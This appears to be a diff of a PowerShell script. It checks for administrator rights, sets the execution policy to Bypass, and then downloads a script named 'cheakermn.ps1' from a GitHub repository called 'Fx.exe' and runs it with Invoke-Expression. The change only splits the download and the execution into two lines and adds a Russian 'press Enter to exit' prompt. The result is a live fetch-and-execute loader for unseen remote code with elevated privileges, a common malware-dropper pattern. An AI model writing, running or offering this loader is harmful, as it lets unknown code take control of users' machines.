@@ -10,4 +10,7 @@ if (-NOT $isAdmin) {
 }
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
-iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
+$script = (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
+iex $script
+
+Read-Host "Нажмите Enter для выхода"
